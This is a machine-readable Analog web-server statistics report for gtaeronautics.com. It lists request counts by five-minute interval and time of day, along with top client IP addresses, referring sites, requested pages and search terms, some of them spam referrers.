5	Rr	1	0.000	2023	11	04	23	05
5	Rr	1	0.000	2023	11	04	23	00
5	Rr	1	0.000	2023	11	04	22	55
5	Rr	0	0.000	2023	11	04	22	50
5	Rr	1	0.000	2023	11	04	22	45
5	Rr	0	0.000	2023	11	04	22	40
5	Rr	1	0.000	2023	11	04	22	35
5	Rr	0	0.000	2023	11	04	22	30
5	Rr	2	0.000	2023	11	04	22	25
5	Rr	1	0.000	2023	11	04	22	20
5	Rr	2	0.000	2023	11	04	22	15
5	Rr	0	0.000	2023	11	04	22	10
5	Rr	0	0.000	2023	11	04	22	05
5	Rr	0	0.000	2023	11	04	22	00
5	Rr	6	0.000	2023	11	04	21	55
5	Rr	2	0.000	2023	11	04	21	50
5	Rr	1	0.000	2023	11	04	21	45
5	Rr	4	0.000	2023	11	04	21	40
5	Rr	0	0.000	2023	11	04	21	35
5	Rr	2	0.000	2023	11	04	21	30
5	Rr	0	0.000	2023	11	04	21	25
5	Rr	2	0.000	2023	11	04	21	20
5	Rr	1	0.000	2023	11	04	21	15
5	Rr	1	0.000	2023	11	04	21	10
5	Rr	0	0.000	2023	11	04	21	05
5	Rr	1	0.000	2023	11	04	21	00
5	Rr	1	0.000	2023	11	04	20	55
5	Rr	29	0.002	2023	11	04	20	50
5	Rr	1	0.000	2023	11	04	20	45
5	Rr	0	0.000	2023	11	04	20	40
5	Rr	0	0.000	2023	11	04	20	35
5	Rr	0	0.000	2023	11	04	20	30
5	Rr	1	0.000	2023	11	04	20	25
5	Rr	1	0.000	2023	11	04	20	20
5	Rr	2	0.000	2023	11	04	20	15
5	Rr	0	0.000	2023	11	04	20	10
5	Rr	2	0.000	2023	11	04	20	05
5	Rr	0	0.000	2023	11	04	20	00
5	Rr	3	0.000	2023	11	04	19	55
5	Rr	1	0.000	2023	11	04	19	50
5	Rr	1	0.000	2023	11	04	19	45
5	Rr	1	0.000	2023	11	04	19	40
5	Rr	0	0.000	2023	11	04	19	35
5	Rr	2	0.000	2023	11	04	19	30
5	Rr	3	0.000	2023	11	04	19	25
5	Rr	1	0.000	2023	11	04	19	20
5	Rr	0	0.000	2023	11	04	19	15
5	Rr	2	0.000	2023	11	04	19	10
5	Rr	1	0.000	2023	11	04	19	05
5	Rr	0	0.000	2023	11	04	19	00
5	Rr	2	0.000	2023	11	04	18	55
5	Rr	0	0.000	2023	11	04	18	50
5	Rr	1	0.000	2023	11	04	18	45
5	Rr	0	0.000	2023	11	04	18	40
5	Rr	0	0.000	2023	11	04	18	35
5	Rr	2	0.000	2023	11	04	18	30
5	Rr	0	0.000	2023	11	04	18	25
5	Rr	2	0.000	2023	11	04	18	20
5	Rr	0	0.000	2023	11	04	18	15
5	Rr	0	0.000	2023	11	04	18	10
5	Rr	0	0.000	2023	11	04	18	05
5	Rr	3	0.000	2023	11	04	18	00
5	Rr	2	0.000	2023	11	04	17	55
5	Rr	1	0.000	2023	11	04	17	50
5	Rr	0	0.000	2023	11	04	17	45
5	Rr	1	0.000	2023	11	04	17	40
5	Rr	1	0.000	2023	11	04	17	35
5	Rr	1	0.000	2023	11	04	17	30
5	Rr	1	0.000	2023	11	04	17	25
5	Rr	8	0.001	2023	11	04	17	20
5	Rr	0	0.000	2023	11	04	17	15
5	Rr	1	0.000	2023	11	04	17	10
5	Rr	0	0.000	2023	11	04	17	05
5	Rr	1	0.000	2023	11	04	17	00
5	Rr	2	0.000	2023	11	04	16	55
5	Rr	0	0.000	2023	11	04	16	50
5	Rr	1	0.000	2023	11	04	16	45
5	Rr	2	0.000	2023	11	04	16	40
5	Rr	0	0.000	2023	11	04	16	35
5	Rr	0	0.000	2023	11	04	16	30
5	Rr	1	0.000	2023	11	04	16	25
5	Rr	2	0.000	2023	11	04	16	20
5	Rr	2	0.000	2023	11	04	16	15
5	Rr	1	0.000	2023	11	04	16	10
5	Rr	0	0.000	2023	11	04	16	05
5	Rr	1	0.000	2023	11	04	16	00
5	Rr	0	0.000	2023	11	04	15	55
5	Rr	0	0.000	2023	11	04	15	50
5	Rr	3	0.000	2023	11	04	15	45
5	Rr	1	0.000	2023	11	04	15	40
5	Rr	0	0.000	2023	11	04	15	35
5	Rr	1	0.000	2023	11	04	15	30
5	Rr	1	0.000	2023	11	04	15	25
5	Rr	1	0.000	2023	11	04	15	20
5	Rr	1	0.000	2023	11	04	15	15
5	Rr	1	0.000	2023	11	04	15	10
5	Rr	1	0.000	2023	11	04	15	05
5	Rr	1	0.000	2023	11	04	15	00
5	Rr	1	0.000	2023	11	04	14	55
5	Rr	2	0.000	2023	11	04	14	50
5	Rr	0	0.000	2023	11	04	14	45
5	Rr	1	0.000	2023	11	04	14	40
5	Rr	10	0.001	2023	11	04	14	35
5	Rr	1	0.000	2023	11	04	14	30
5	Rr	1	0.000	2023	11	04	14	25
5	Rr	1	0.000	2023	11	04	14	20
5	Rr	8	0.001	2023	11	04	14	15
5	Rr	0	0.000	2023	11	04	14	10
5	Rr	0	0.000	2023	11	04	14	05
5	Rr	1	0.000	2023	11	04	14	00
5	Rr	0	0.000	2023	11	04	13	55
5	Rr	0	0.000	2023	11	04	13	50
5	Rr	0	0.000	2023	11	04	13	45
5	Rr	0	0.000	2023	11	04	13	40
5	Rr	1	0.000	2023	11	04	13	35
5	Rr	0	0.000	2023	11	04	13	30
5	Rr	0	0.000	2023	11	04	13	25
5	Rr	1	0.000	2023	11	04	13	20
5	Rr	0	0.000	2023	11	04	13	15
5	Rr	1	0.000	2023	11	04	13	10
5	Rr	0	0.000	2023	11	04	13	05
5	Rr	0	0.000	2023	11	04	13	00
5	Rr	4	0.000	2023	11	04	12	55
5	Rr	0	0.000	2023	11	04	12	50
5	Rr	1	0.000	2023	11	04	12	45
5	Rr	0	0.000	2023	11	04	12	40
5	Rr	0	0.000	2023	11	04	12	35
5	Rr	0	0.000	2023	11	04	12	30
5	Rr	0	0.000	2023	11	04	12	25
5	Rr	0	0.000	2023	11	04	12	20
5	Rr	1	0.000	2023	11	04	12	15
5	Rr	0	0.000	2023	11	04	12	10
5	Rr	0	0.000	2023	11	04	12	05
5	Rr	0	0.000	2023	11	04	12	00
5	Rr	0	0.000	2023	11	04	11	55
5	Rr	20	0.001	2023	11	04	11	50
5	Rr	1	0.000	2023	11	04	11	45
5	Rr	0	0.000	2023	11	04	11	40
5	Rr	1	0.000	2023	11	04	11	35
5	Rr	0	0.000	2023	11	04	11	30
5	Rr	4	0.000	2023	11	04	11	25
5	Rr	1	0.000	2023	11	04	11	20
5	Rr	0	0.000	2023	11	04	11	15
5	Rr	0	0.000	2023	11	04	11	10
5	Rr	1	0.000	2023	11	04	11	05
5	Rr	0	0.000	2023	11	04	11	00
5	Rr	2	0.000	2023	11	04	10	55
5	Rr	2	0.000	2023	11	04	10	50
5	Rr	0	0.000	2023	11	04	10	45
5	Rr	2	0.000	2023	11	04	10	40
5	Rr	4	0.000	2023	11	04	10	35
5	Rr	1	0.000	2023	11	04	10	30
5	Rr	0	0.000	2023	11	04	10	25
5	Rr	0	0.000	2023	11	04	10	20
5	Rr	0	0.000	2023	11	04	10	15
5	Rr	0	0.000	2023	11	04	10	10
5	Rr	1	0.000	2023	11	04	10	05
5	Rr	1	0.000	2023	11	04	10	00
5	Rr	0	0.000	2023	11	04	09	55
5	Rr	1	0.000	2023	11	04	09	50
5	Rr	0	0.000	2023	11	04	09	45
5	Rr	1	0.000	2023	11	04	09	40
5	Rr	0	0.000	2023	11	04	09	35
5	Rr	2	0.000	2023	11	04	09	30
5	Rr	0	0.000	2023	11	04	09	25
5	Rr	1	0.000	2023	11	04	09	20
5	Rr	1	0.000	2023	11	04	09	15
5	Rr	0	0.000	2023	11	04	09	10
5	Rr	7	0.000	2023	11	04	09	05
5	Rr	0	0.000	2023	11	04	09	00
5	Rr	1	0.000	2023	11	04	08	55
5	Rr	1	0.000	2023	11	04	08	50
5	Rr	0	0.000	2023	11	04	08	45
5	Rr	3	0.000	2023	11	04	08	40
5	Rr	1	0.000	2023	11	04	08	35
5	Rr	0	0.000	2023	11	04	08	30
5	Rr	0	0.000	2023	11	04	08	25
5	Rr	0	0.000	2023	11	04	08	20
5	Rr	0	0.000	2023	11	04	08	15
5	Rr	0	0.000	2023	11	04	08	10
5	Rr	0	0.000	2023	11	04	08	05
5	Rr	2	0.000	2023	11	04	08	00
5	Rr	0	0.000	2023	11	04	07	55
5	Rr	0	0.000	2023	11	04	07	50
5	Rr	0	0.000	2023	11	04	07	45
5	Rr	0	0.000	2023	11	04	07	40
5	Rr	0	0.000	2023	11	04	07	35
5	Rr	0	0.000	2023	11	04	07	30
5	Rr	1	0.000	2023	11	04	07	25
5	Rr	1	0.000	2023	11	04	07	20
5	Rr	2	0.000	2023	11	04	07	15
5	Rr	0	0.000	2023	11	04	07	10
5	Rr	0	0.000	2023	11	04	07	05
5	Rr	0	0.000	2023	11	04	07	00
5	Rr	4	0.000	2023	11	04	06	55
5	Rr	0	0.000	2023	11	04	06	50
5	Rr	0	0.000	2023	11	04	06	45
5	Rr	0	0.000	2023	11	04	06	40
5	Rr	0	0.000	2023	11	04	06	35
5	Rr	1	0.000	2023	11	04	06	30
5	Rr	1	0.000	2023	11	04	06	25
5	Rr	1	0.000	2023	11	04	06	20
5	Rr	4	0.000	2023	11	04	06	15
5	Rr	0	0.000	2023	11	04	06	10
5	Rr	0	0.000	2023	11	04	06	05
5	Rr	0	0.000	2023	11	04	06	00
5	Rr	0	0.000	2023	11	04	05	55
5	Rr	0	0.000	2023	11	04	05	50
5	Rr	0	0.000	2023	11	04	05	45
5	Rr	0	0.000	2023	11	04	05	40
5	Rr	0	0.000	2023	11	04	05	35
5	Rr	0	0.000	2023	11	04	05	30
5	Rr	0	0.000	2023	11	04	05	25
5	Rr	0	0.000	2023	11	04	05	20
5	Rr	1	0.000	2023	11	04	05	15
5	Rr	0	0.000	2023	11	04	05	10
5	Rr	0	0.000	2023	11	04	05	05
5	Rr	0	0.000	2023	11	04	05	00
5	Rr	0	0.000	2023	11	04	04	55
5	Rr	0	0.000	2023	11	04	04	50
5	*BT	R	945	2023	05	08	18	00
7	Rr	4400	0.295	00	00
7	Rr	4477	0.300	00	05
7	Rr	4812	0.323	00	10
7	Rr	3685	0.247	00	15
7	Rr	4718	0.316	00	20
7	Rr	5497	0.369	00	25
7	Rr	4656	0.312	00	30
7	Rr	5111	0.343	00	35
7	Rr	4796	0.322	00	40
7	Rr	4929	0.330	00	45
7	Rr	4995	0.335	00	50
7	Rr	4843	0.325	00	55
7	Rr	4409	0.296	01	00
7	Rr	4551	0.305	01	05
7	Rr	4166	0.279	01	10
7	Rr	4971	0.333	01	15
7	Rr	5346	0.358	01	20
7	Rr	4395	0.295	01	25
7	Rr	4376	0.293	01	30
7	Rr	4365	0.293	01	35
7	Rr	5133	0.344	01	40
7	Rr	4553	0.305	01	45
7	Rr	5217	0.350	01	50
7	Rr	5018	0.336	01	55
7	Rr	4364	0.293	02	00
7	Rr	4296	0.288	02	05
7	Rr	4396	0.295	02	10
7	Rr	5149	0.345	02	15
7	Rr	4336	0.291	02	20
7	Rr	4989	0.334	02	25
7	Rr	5059	0.339	02	30
7	Rr	5059	0.339	02	35
7	Rr	4875	0.327	02	40
7	Rr	4455	0.299	02	45
7	Rr	4633	0.311	02	50
7	Rr	5299	0.355	02	55
7	Rr	5265	0.353	03	00
7	Rr	4653	0.312	03	05
7	Rr	4631	0.310	03	10
7	Rr	4552	0.305	03	15
7	Rr	4659	0.312	03	20
7	Rr	4702	0.315	03	25
7	Rr	4753	0.319	03	30
7	Rr	4781	0.321	03	35
7	Rr	4661	0.312	03	40
7	Rr	5602	0.376	03	45
7	Rr	6490	0.435	03	50
7	Rr	5142	0.345	03	55
7	Rr	4656	0.312	04	00
7	Rr	4405	0.295	04	05
7	Rr	4771	0.320	04	10
7	Rr	4909	0.329	04	15
7	Rr	4360	0.292	04	20
7	Rr	4490	0.301	04	25
7	Rr	4552	0.305	04	30
7	Rr	4627	0.310	04	35
7	Rr	5090	0.341	04	40
7	Rr	5297	0.355	04	45
7	Rr	4856	0.326	04	50
7	Rr	4923	0.330	04	55
7	Rr	4535	0.304	05	00
7	Rr	4195	0.281	05	05
7	Rr	4069	0.273	05	10
7	Rr	5063	0.339	05	15
7	Rr	4837	0.324	05	20
7	Rr	4420	0.296	05	25
7	Rr	4593	0.308	05	30
7	Rr	4607	0.309	05	35
7	Rr	4024	0.270	05	40
7	Rr	4226	0.283	05	45
7	Rr	4214	0.283	05	50
7	Rr	4640	0.311	05	55
7	Rr	4308	0.289	06	00
7	Rr	4883	0.327	06	05
7	Rr	4351	0.292	06	10
7	Rr	4461	0.299	06	15
7	Rr	3810	0.255	06	20
7	Rr	4202	0.282	06	25
7	Rr	4215	0.283	06	30
7	Rr	4513	0.303	06	35
7	Rr	4353	0.292	06	40
7	Rr	4105	0.275	06	45
7	Rr	3997	0.268	06	50
7	Rr	3655	0.245	06	55
7	Rr	5353	0.359	07	00
7	Rr	4170	0.280	07	05
7	Rr	3927	0.263	07	10
7	Rr	3932	0.264	07	15
7	Rr	4681	0.314	07	20
7	Rr	4595	0.308	07	25
7	Rr	4291	0.288	07	30
7	Rr	4474	0.300	07	35
7	Rr	4085	0.274	07	40
7	Rr	4579	0.307	07	45
7	Rr	3682	0.247	07	50
7	Rr	3792	0.254	07	55
7	Rr	4211	0.282	08	00
7	Rr	3759	0.252	08	05
7	Rr	3862	0.259	08	10
7	Rr	4127	0.277	08	15
7	Rr	4081	0.274	08	20
7	Rr	4336	0.291	08	25
7	Rr	4084	0.274	08	30
7	Rr	4052	0.272	08	35
7	Rr	4523	0.303	08	40
7	Rr	4260	0.286	08	45
7	Rr	3673	0.246	08	50
7	Rr	3548	0.238	08	55
7	Rr	3760	0.252	09	00
7	Rr	3662	0.246	09	05
7	Rr	3421	0.229	09	10
7	Rr	3144	0.211	09	15
7	Rr	3820	0.256	09	20
7	Rr	4194	0.281	09	25
7	Rr	3805	0.255	09	30
7	Rr	3821	0.256	09	35
7	Rr	4785	0.321	09	40
7	Rr	3676	0.246	09	45
7	Rr	3638	0.244	09	50
7	Rr	3836	0.257	09	55
7	Rr	3762	0.252	10	00
7	Rr	3637	0.244	10	05
7	Rr	4085	0.274	10	10
7	Rr	3712	0.249	10	15
7	Rr	4207	0.282	10	20
7	Rr	4743	0.318	10	25
7	Rr	4413	0.296	10	30
7	Rr	4190	0.281	10	35
7	Rr	4193	0.281	10	40
7	Rr	3765	0.252	10	45
7	Rr	4344	0.291	10	50
7	Rr	4109	0.275	10	55
7	Rr	5694	0.382	11	00
7	Rr	4402	0.295	11	05
7	Rr	4349	0.292	11	10
7	Rr	4163	0.279	11	15
7	Rr	3963	0.266	11	20
7	Rr	5229	0.351	11	25
7	Rr	5719	0.383	11	30
7	Rr	3750	0.251	11	35
7	Rr	4179	0.280	11	40
7	Rr	3984	0.267	11	45
7	Rr	3930	0.263	11	50
7	Rr	3902	0.262	11	55
7	Rr	4774	0.320	12	00
7	Rr	4649	0.312	12	05
7	Rr	4747	0.318	12	10
7	Rr	4105	0.275	12	15
7	Rr	4371	0.293	12	20
7	Rr	4329	0.290	12	25
7	Rr	4125	0.277	12	30
7	Rr	4157	0.279	12	35
7	Rr	4107	0.275	12	40
7	Rr	4544	0.305	12	45
7	Rr	4870	0.326	12	50
7	Rr	4731	0.317	12	55
7	Rr	4328	0.290	13	00
7	Rr	4177	0.280	13	05
7	Rr	4536	0.304	13	10
7	Rr	5046	0.338	13	15
7	Rr	5145	0.345	13	20
7	Rr	5244	0.352	13	25
7	Rr	4542	0.305	13	30
7	Rr	5108	0.342	13	35
7	Rr	5490	0.368	13	40
7	Rr	3967	0.266	13	45
7	Rr	5407	0.362	13	50
7	Rr	4982	0.334	13	55
7	Rr	5368	0.360	14	00
7	Rr	6079	0.408	14	05
7	Rr	5462	0.366	14	10
7	Rr	6622	0.444	14	15
7	Rr	6501	0.436	14	20
7	Rr	5578	0.374	14	25
7	Rr	5958	0.399	14	30
7	Rr	5668	0.380	14	35
7	Rr	5665	0.380	14	40
7	Rr	5628	0.377	14	45
7	Rr	5018	0.336	14	50
7	Rr	6818	0.457	14	55
7	Rr	6678	0.448	15	00
7	Rr	5318	0.357	15	05
7	Rr	5899	0.395	15	10
7	Rr	5403	0.362	15	15
7	Rr	6389	0.428	15	20
7	Rr	6189	0.415	15	25
7	Rr	6342	0.425	15	30
7	Rr	5830	0.391	15	35
7	Rr	7523	0.504	15	40
7	Rr	5674	0.380	15	45
7	Rr	6670	0.447	15	50
7	Rr	6967	0.467	15	55
7	Rr	5933	0.398	16	00
7	Rr	7038	0.472	16	05
7	Rr	7027	0.471	16	10
7	Rr	7376	0.495	16	15
7	Rr	6654	0.446	16	20
7	Rr	5870	0.394	16	25
7	Rr	5749	0.385	16	30
7	Rr	6455	0.433	16	35
7	Rr	6847	0.459	16	40
7	Rr	7002	0.469	16	45
7	Rr	7494	0.502	16	50
7	Rr	6440	0.432	16	55
7	Rr	7254	0.486	17	00
7	Rr	7228	0.485	17	05
7	Rr	7002	0.469	17	10
7	Rr	6545	0.439	17	15
7	Rr	7627	0.511	17	20
7	Rr	7131	0.478	17	25
7	Rr	7590	0.509	17	30
7	Rr	6872	0.461	17	35
7	Rr	6976	0.468	17	40
7	Rr	6706	0.450	17	45
7	Rr	6545	0.439	17	50
7	Rr	6477	0.434	17	55
7	Rr	7686	0.515	18	00
7	Rr	6240	0.418	18	05
7	Rr	7072	0.474	18	10
7	Rr	6469	0.434	18	15
7	Rr	6137	0.411	18	20
7	Rr	6085	0.408	18	25
7	Rr	7078	0.475	18	30
7	Rr	6160	0.413	18	35
7	Rr	7036	0.472	18	40
7	Rr	6004	0.403	18	45
7	Rr	7217	0.484	18	50
7	Rr	6326	0.424	18	55
7	Rr	7313	0.490	19	00
7	Rr	6887	0.462	19	05
7	Rr	6598	0.442	19	10
7	Rr	6291	0.422	19	15
7	Rr	6403	0.429	19	20
7	Rr	6525	0.437	19	25
7	Rr	6233	0.418	19	30
7	Rr	6811	0.457	19	35
7	Rr	6392	0.429	19	40
7	Rr	6432	0.431	19	45
7	Rr	6639	0.445	19	50
7	Rr	6825	0.458	19	55
7	Rr	6661	0.447	20	00
7	Rr	6010	0.403	20	05
7	Rr	6228	0.418	20	10
7	Rr	6288	0.422	20	15
7	Rr	7256	0.486	20	20
7	Rr	5997	0.402	20	25
7	Rr	5737	0.385	20	30
7	Rr	5718	0.383	20	35
7	Rr	5446	0.365	20	40
7	Rr	7082	0.475	20	45
7	Rr	6389	0.428	20	50
7	Rr	6357	0.426	20	55
7	Rr	6445	0.432	21	00
7	Rr	5574	0.374	21	05
7	Rr	5839	0.391	21	10
7	Rr	6168	0.414	21	15
7	Rr	5559	0.373	21	20
7	Rr	6485	0.435	21	25
7	Rr	5043	0.338	21	30
7	Rr	6028	0.404	21	35
7	Rr	5355	0.359	21	40
7	Rr	7314	0.490	21	45
7	Rr	6262	0.420	21	50
7	Rr	5105	0.342	21	55
7	Rr	4987	0.334	22	00
7	Rr	5304	0.356	22	05
7	Rr	5348	0.359	22	10
7	Rr	5264	0.353	22	15
7	Rr	5310	0.356	22	20
7	Rr	5330	0.357	22	25
7	Rr	5357	0.359	22	30
7	Rr	5511	0.369	22	35
7	Rr	5271	0.353	22	40
7	Rr	6252	0.419	22	45
7	Rr	5444	0.365	22	50
7	Rr	4919	0.330	22	55
7	Rr	5702	0.382	23	00
7	Rr	5364	0.360	23	05
7	Rr	5226	0.350	23	10
7	Rr	5795	0.389	23	15
7	Rr	6143	0.412	23	20
7	Rr	4929	0.330	23	25
7	Rr	4399	0.295	23	30
7	Rr	4858	0.326	23	35
7	Rr	4898	0.328	23	40
7	Rr	4534	0.304	23	45
7	Rr	5086	0.341	23	50
7	Rr	5110	0.343	23	55
o	*f	0R	r
o	lRQ	1	1491607	32459890	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	61763	2.566	66.249
Z	lRb	1	57996	3.582	98
Z	lRb	1	48682	2.524	51
Z	lRb	1	42624	1.401	69
Z	lRb	1	41329	2.025	35
Z	lRb	1	39271	1.794	34
Z	lRb	1	29401	2.897	54
Z	lRb	1	28419	0.506	49
Z	lRb	1	25920	0.641	46
Z	lRb	1	24960	2.469	157.55
Z	lRb	1	24443	0.945	123
Z	lRb	1	23597	2.331	40
Z	lRb	1	22815	2.596	70
Z	lRb	1	20470	1.924	207.46
Z	lRb	1	19715	1.160	76
Z	lRb	1	16334	1.539	72
Z	lRb	1	15378	0.895	75
Z	lRb	1	15149	1.170	104
Z	lRb	1	14684	1.032	52
Z	lRb	1	14047	1.201	5
Z	lRb	1	904610	64.801	[not listed: 9102]
S	*f	-50P	r
S	Rb	4702	0.294	14.33.246.211
S	Rb	3866	0.592	192.234.235.103
S	Rb	3248	0.184	192.99.15.146
S	Rb	2800	0.027	162.55.85.223
S	Rb	2542	0.020	49.7.20.111
S	Rb	2489	0.009	49.7.20.105
S	Rb	2341	0.102	100.43.83.148
S	Rb	2179	0.222	216.244.66.229
S	Rb	1992	0.051	66.249.75.109
S	Rb	1829	0.111	37.59.14.116
S	Rb	1781	0.161	75.98.173.33
S	Rb	1736	0.215	79.125.27.96
S	Rb	1597	0.097	78.155.138.20
S	Rb	1549	0.107	68.66.226.98
S	Rb	1543	0.055	199.21.99.79
S	Rb	1459	0.008	92.249.127.111
S	Rb	1455	0.000	49.7.20.135
S	Rb	1352	0.045	49.7.20.102
S	Rb	1330	0.014	109.102.111.58
S	Rb	1312	0.033	205.203.134.197
S	Rb	1304	0.144	5.196.13.127
S	Rb	1285	0.033	144.76.27.118
S	Rb	1276	0.089	208.115.113.82
S	Rb	1270	0.048	95.108.248.29
S	Rb	1155	0.173	75.98.173.84
S	Rb	1142	0.001	91.207.9.226
S	Rb	1107	0.012	66.249.69.97
S	Rb	1081	0.014	66.249.69.81
S	Rb	1051	0.024	66.249.69.192
S	Rb	1048	0.064	157.90.182.26
S	Rb	1047	0.013	106.38.241.144
S	Rb	1039	0.011	66.249.69.89
S	Rb	1030	0.073	5.255.250.90
S	Rb	1024	0.055	95.108.150.235
S	Rb	1012	0.061	192.99.6.132
S	Rb	957	0.136	199.21.99.197
S	Rb	951	0.046	66.249.73.133
S	Rb	912	0.000	49.7.21.93
S	Rb	890	0.009	78.129.149.5
S	Rb	828	0.000	49.7.21.96
S	Rb	815	0.022	178.63.23.80
S	Rb	814	0.014	52.35.20.1
S	Rb	808	0.136	149.202.211.239
S	Rb	795	0.052	49.7.20.108
S	Rb	791	0.048	192.99.7.55
S	Rb	786	0.087	66.11.128.152
S	Rb	777	0.001	193.150.120.14
S	Rb	760	0.038	208.115.113.92
S	Rb	760	0.000	49.7.21.69
S	Rb	744	0.007	109.102.111.20
S	Rb	1419246	96.238	[not listed: 106092]
s	*FR	2013	12	18	21	53
s	*LR	2023	11	05	04	06
s	*f	-20R	s
s	lRS	1	393114	806	http://www.gtaeronautics.com/
s	lRS	1	96692	226	http://gtaeronautics.com/
s	lRS	1	7552	15	https://www.google.com/
s	lRS	1	1629	3	http://www.google.com/
s	lRS	1	1287	0	http://www.baidu.com/
s	lRS	1	1159	0	http://www.trainingindustry.com/
s	lRS	1	609	0	http://www.mfgpages.com/
s	lRS	1	604	0	http://www.openfos.com/
s	lRS	1	517	0	http://www.topicway.com/
s	lRS	1	475	0	https://www.bing.com/
s	lRS	1	462	0	http://anti-crisis-seo.com/
s	lRS	1	399	0	https://www.thomasnet.com/
s	lRS	1	395	0	http://uptime.com/
s	lRS	1	388	0	http://baidu.com/
s	lRS	1	362	0	http://semalt.semalt.com/
s	lRS	1	328	0	http://www.bing.com/
s	lRS	1	301	0	http://chimiver.info/
s	lRS	1	281	0	https://www.google.co.in/
s	lRS	1	262	0	http://google.co.jp/
s	lRS	1	236	0	http://www.thomasnet.com/
s	lRS	1	49865	4	[not listed: 4424]
f	*FR	2013	12	18	21	53
f	*LR	2023	11	05	04	06
f	*f	-30R	s
f	lRS	1	288773	656	http://www.gtaeronautics.com/
f	lRS	1	65122	104	http://gtaeronautics.com/
f	lRS	1	9983	78	http://www.gtaeronautics.com/index.html
f	lRS	1	2562	78	http://gtaeronautics.com/links.html
f	lRS	1	4343	21	http://www.gtaeronautics.com/GT380 RPAS.html
f	lRS	1	6972	14	https://www.google.com/
f	lRS	1	2959	9	http://gtaeronautics.com/aboutus.html
f	lRS	1	15225	7	http://www.gtaeronautics.com/aboutus.html
f	lRS	1	2746	6	http://gtaeronautics.com/contactus.html
f	lRS	1	2720	6	http://www.gtaeronautics.com/RD.html
f	lRS	1	2525	5	http://www.gtaeronautics.com/contactus.html
f	lRS	1	9163	3	http://www.gtaeronautics.com/CCT&M.html
f	lRS	1	3311	3	http://www.gtaeronautics.com/GT50T RPAS.html
f	lRS	1	3287	3	http://www.gtaeronautics.com/SRU.html
f	lRS	1	2631	3	http://gtaeronautics.com/index.html
f	lRS	1	2516	3	http://www.gtaeronautics.com/CFMT.html
f	lRS	1	3567	1	http://www.gtaeronautics.com/pna.html
f	lRS	1	7934	0	http://www.gtaeronautics.com/UASFC.html
f	lRS	1	5881	0	http://www.gtaeronautics.com/ConsultingA.html
f	lRS	1	5838	0	http://gtaeronautics.com/IndNews.html
f	lRS	1	3648	0	http://www.gtaeronautics.com/compnews.html
f	lRS	1	3577	0	http://www.gtaeronautics.com/CompNews.html
f	lRS	1	3490	0	http://www.gtaeronautics.com/GT1500 RPAS.html
f	lRS	1	2577	0	http://www.gtaeronautics.com/IndNews.html
f	lRS	1	2515	0	http://www.gtaeronautics.com/consultinga.html
f	lRS	1	2496	0	http://gtaeronautics.com/CCT&M.html
f	lRS	1	2414	0	http://www.gtaeronautics.com/uasfc.html
f	lRS	1	1935	0	http://www.gtaeronautics.com/EMPLOYMENT.html
f	lRS	1	1791	0	http://gtaeronautics.com/ConsultingA.html
f	lRS	1	1706	0	http://www.gtaeronautics.com/links.html
f	lRS	1	82710	54	[not listed: 5129]
n	*FR	2013	12	19	00	28
n	*LR	2020	10	14	09	11
n	*f	0.500000%Q	s
n	Rq	1	62.259	kit
n	Rq	1	62.259	method
n	Rq	2	11.587	crew
n	Rq	28	14.528	aeronautical
n	Rq	1	62.259	airplane.com
n	Rq	5	85.433	faa
n	Rq	40	49.290	gt
n	Rq	1	62.259	moldings
n	Rq	1	62.259	twin
n	Rq	1	62.259	taranis
n	Rq	2	62.259	installerex
n	Rq	2	62.259	http://gtaeronautics.com/
n	Rq	20	57.936	in
n	Rq	1	62.259	scale
n	Rq	1	62.259	observer
n	Rq	1	62.259	drawing?
n	Rq	2	62.259	is
n	Rq	1	62.259	making
n	Rq	2	11.587	fiber
n	Rq	1	62.259	mitsubishi
n	Rq	1	62.259	fuze
n	Rq	1	62.259	http://www.gtaeronautics.com/indnews.html
n	Rq	92	62.259	semalt.com
n	Rq	1	62.259	consultant
n	Rq	15	23.174	manufacturing
n	Rq	1	62.259	2
n	Rq	1	62.259	base
n	Rq	14	81.110	6
n	Rq	1	62.259	http://gtaeronautics.com/indnews.html
n	Rq	1	62.259	always
n	Rq	28	88.374	engineering
n	Rq	1	62.259	northrop
n	Rq	1	62.259	bandwidth
n	Rq	1	62.259	vegas
n	Rq	3	11.587	basic
n	Rq	1	62.259	qinetiq
n	Rq	1	62.259	tooling
n	Rq	1	62.259	on
n	Rq	1	62.259	heavy
n	Rq	9	46.349	drawings
n	Rq	1	62.259	fia
n	Rq	4	62.259	louis%20vuitton%20fashion%20valley%20phone%20number
n	Rq	3	62.259	llc
n	Rq	3	73.846	rullman
n	Rq	1	62.259	cowling
n	Rq	32	73.846	sale
n	Rq	64	34.761	outlet
n	Rq	1	62.259	rotax
n	Rq	1	62.259	ucav
n	Rq	28	26.115	texan
n	Rq	1	62.259	a
n	Rq	2	62.259	customer
n	Rq	1	62.259	rpa
n	Rq	2	11.587	110cc
n	Rq	30	62.259	designer
n	Rq	20	85.433	www.gtaeronautics.com
n	Rq	1	62.259	work
n	Rq	1	62.259	thomas
n	Rq	1	62.259	engie
n	Rq	1	62.259	qualification
n	Rq	1	62.259	custom
n	Rq	1	62.259	mk3
n	Rq	1	62.259	t
n	Rq	1	62.259	uavs
n	Rq	1	62.259	w
n	Rq	2	62.259	satisfaction
n	Rq	2	11.587	x
n	Rq	1	62.259	crews
n	Rq	3	62.259	photos
n	Rq	1	62.259	finnemeccia
n	Rq	2	11.587	glass
n	Rq	1	73.846	to
n	Rq	1	62.259	gcs
n	Rq	5	85.433	engineer
n	Rq	1	62.259	government
n	Rq	1	62.259	operator
n	Rq	6	34.761	aircraft
n	Rq	1	62.259	with
n	Rq	97	11.587	number
n	Rq	4	73.846	for
n	Rq	1	62.259	december
n	Rq	2	11.587	aero
n	Rq	9	11.587	equipment
n	Rq	2	11.587	engine
n	Rq	1	62.259	mq1
n	Rq	2	11.587	wy
n	Rq	1	62.259	custum
n	Rq	1	62.259	g.t
n	Rq	1	62.259	mechanics
n	Rq	1	11.587	motors
n	Rq	1	62.259	tdw
n	Rq	32	85.433	luggage
n	Rq	1	62.259	opportunities
n	Rq	175	42.026	vuitton
n	Rq	1	62.259	show
n	Rq	1	73.846	the
n	Rq	1	62.259	luggages
n	Rq	1	62.259	stroke
n	Rq	2	62.259	explore
n	Rq	39	11.587	handbags
n	Rq	2	11.587	electric
n	Rq	1	62.259	space
n	Rq	1	11.587	air
n	Rq	1	62.259	quote
n	Rq	1	62.259	require
n	Rq	1	62.259	mpp
n	Rq	4	11.587	jobs
n	Rq	5	85.433	uas
n	Rq	1	62.259	anything
n	Rq	1	62.259	china
n	Rq	1	62.259	airplane
n	Rq	10	57.936	uav
n	Rq	2	62.259	wmaid.com
n	Rq	3	23.174	drone
n	Rq	7	97.020	fiberglass
